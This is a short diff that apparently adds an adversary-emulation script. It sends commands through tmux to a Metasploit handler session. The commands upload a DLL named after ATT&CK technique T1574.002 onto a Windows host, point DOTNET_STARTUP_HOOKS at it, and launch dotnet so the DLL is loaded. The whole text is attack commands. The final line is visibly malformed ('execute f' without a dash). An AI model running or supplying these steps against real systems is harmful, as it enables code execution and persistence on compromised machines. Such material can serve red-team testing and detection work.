@@ -1,0 +1,4 @@
+tmux send-keys -t metasploit_handler 'upload C:\\Program Files\\dotnet\\T1574_002.dll' C-m
+tmux send-keys -t metasploit_handler 'execute -f powershell.exe -Command "set DOTNET_STARTUP_HOOKS=C:\\Program Files\\dotnet\\T1574_002.dll"' C-m
+tmux send-keys -t metasploit_handler 'execute -f dotnet -h > nul' C-m
+tmux send-keys -t metasploit_handler 'execute f powershell.exe -Command "echo 1"' C-m
